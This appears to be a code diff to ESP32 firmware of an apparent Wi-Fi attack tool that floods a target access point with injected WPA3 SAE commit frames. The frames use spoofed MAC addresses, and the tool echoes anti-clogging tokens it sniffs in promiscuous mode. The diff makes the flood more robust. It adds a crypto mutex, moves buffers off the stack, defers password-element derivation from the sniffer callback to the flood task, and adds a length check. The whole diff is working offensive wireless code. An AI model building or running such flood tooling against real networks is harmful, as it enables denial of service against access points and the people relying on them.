@@ -20,6 +20,7 @@
 #include "esp_log.h"
 #include "freertos/task.h"
 #include "freertos/portmacro.h"
+#include "freertos/semphr.h"
 #define MBEDTLS_DECLARE_PRIVATE_IDENTIFIERS
 #include "mbedtls/private/ecp.h"
 #include "mbedtls/private/sha256.h"
@@ -77,6 +78,10 @@ static uint32_t sae_status0_rx = 0;
 static uint8_t sae_token_mac[6];
 static bool sae_token_mac_valid = false;
 
+static volatile bool sae_pending_peer = false;
+static uint8_t sae_pending_scalar[32];
+static uint8_t sae_pending_element[33];
+
 // SAE protocol state
 typedef struct {
     uint8_t peer_mac[6];
@@ -103,6 +108,7 @@ typedef struct {
 static sae_data_t sae_ctx;
 static bool sae_initialized = false;
 static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
+static SemaphoreHandle_t sae_crypto_mutex = NULL;
 
 // Static buffers to reduce stack usage
 static uint8_t sae_pwd_seed[128];
@@ -134,6 +140,8 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1, 
                                 const uint8_t *addr2, const char *ssid,
                                 mbedtls_ecp_point *pwe, mbedtls_ecp_group *group) {
+    if (!sae_crypto_mutex) sae_crypto_mutex = xSemaphoreCreateMutex();
+    if (sae_crypto_mutex) xSemaphoreTake(sae_crypto_mutex, portMAX_DELAY);
     mbedtls_mpi x, y, tmp;
     int counter = 1;
     bool found = false;
@@ -195,6 +203,7 @@ static esp_err_t sae_derive_pwe(const char *password, const uint8_t *addr1,
     mbedtls_sha256_free(&sae_sha256);
     ESP_LOGI("SAE_PWE", "derive %s", found ? "ok" : "fail");
     
+    if (sae_crypto_mutex) xSemaphoreGive(sae_crypto_mutex);
     return found ? ESP_OK : ESP_FAIL;
 }
 
@@ -298,11 +307,14 @@ static void sanitize_password_input(const char *in, char *out, size_t out_size) 
     out[n] = '\0';
 }
 
+static uint8_t sae_inj_token_buf[128];
+static uint8_t sae_inj_element_x[32];
+static uint8_t sae_inj_element_buf[33];
+
 static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     int frame_len = 0;
     bool token_required_local = false;
     uint16_t token_len_local = 0;
-    uint8_t token_buf_local[128];
     
     // 802.11 Authentication header
     sae_frame_buffer[0] = 0xb0; sae_frame_buffer[1] = 0x00;
@@ -325,8 +337,8 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     token_required_local = sae_ctx.token_required;
     token_len_local = sae_ctx.token_len;
     if (token_required_local && token_len_local > 0) {
-        if (token_len_local > sizeof(token_buf_local)) token_len_local = sizeof(token_buf_local);
-        memcpy(token_buf_local, sae_ctx.token, token_len_local);
+        if (token_len_local > sizeof(sae_inj_token_buf)) token_len_local = sizeof(sae_inj_token_buf);
+        memcpy(sae_inj_token_buf, sae_ctx.token, token_len_local);
     }
     portEXIT_CRITICAL(&sae_lock);
     ESP_LOGI("SAE_TX", "commit hdr ok, token=%d len=%u", token_required_local, (unsigned)token_len_local);
@@ -398,21 +410,19 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     }
     
     if (!used_cache) {
-        uint8_t element_x[32];
         size_t elen = 0;
-        uint8_t element_buf[33];
         if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                            MBEDTLS_ECP_PF_COMPRESSED, &elen,
-                                           element_buf, sizeof(element_buf)) != 0 || elen < 33) {
+                                           sae_inj_element_buf, sizeof(sae_inj_element_buf)) != 0 || elen < 33) {
             return ESP_FAIL;
         }
-        memcpy(element_x, element_buf + 1, 32);
+        memcpy(sae_inj_element_x, sae_inj_element_buf + 1, 32);
         if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
             return ESP_ERR_NO_MEM;
         }
         mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
         frame_len += 32;
-        memcpy(sae_frame_buffer + frame_len, element_x, 32);
+        memcpy(sae_frame_buffer + frame_len, sae_inj_element_x, 32);
         frame_len += 32;
     }
     ESP_LOGI("SAE_TX", "frm len=%d", frame_len);
@@ -421,7 +431,7 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
         size_t remaining = sizeof(sae_frame_buffer) - frame_len;
         if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
         if (token_len_local > 0) {
-            memcpy(sae_frame_buffer + frame_len, token_buf_local, token_len_local);
+            memcpy(sae_frame_buffer + frame_len, sae_inj_token_buf, token_len_local);
             frame_len += token_len_local;
         }
     }
@@ -463,6 +473,15 @@ static void sae_flood_task(void *param) {
     while (sae_flood_running) {
         if ((frame_counter % 100) == 0) {
             ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
+        }
+        if (sae_pending_peer) {
+            const char *pwe_pwd = settings_get_sta_password(&G_Settings);
+            const char *pwe_ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+            if (pwe_pwd && strlen(pwe_pwd) > 0) {
+                ESP_LOGI("SAE_FLOOD", "processing pending peer data");
+                sae_derive_pwe(pwe_pwd, sae_ctx.own_mac, sae_target_bssid, pwe_ssid, &sae_ctx.pwe, &sae_ctx.group);
+            }
+            sae_pending_peer = false;
         }
         if (sae_token_mac_valid) {
             memcpy(spoofed_mac, sae_token_mac, 6);
@@ -592,6 +611,9 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
             sae_status76_rx++;
         } else if (status_code == 0) {
             ESP_LOGI("SAE_RX", "status 0 commit accepted");
+            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
+            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
+            if (remaining < 64) return;
             uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
             if (group_id == 19) {
                 mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
@@ -614,11 +636,10 @@ static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
                     }
                 }
 
-                const char *pwd = settings_get_sta_password(&G_Settings);
-                const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
-                if (pwd && strlen(pwd) > 0) {
-                    ESP_LOGI("SAE_RX", "derive pwe for confirm path");
-                    sae_derive_pwe(pwd, sae_ctx.own_mac, sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group);
+                if (!sae_pending_peer) {
+                    memcpy(sae_pending_scalar, auth_body + 8, 32);
+                    memcpy(sae_pending_element, peer_element_buf, 33);
+                    sae_pending_peer = true;
                 }
                 
                 sae_status0_rx++;
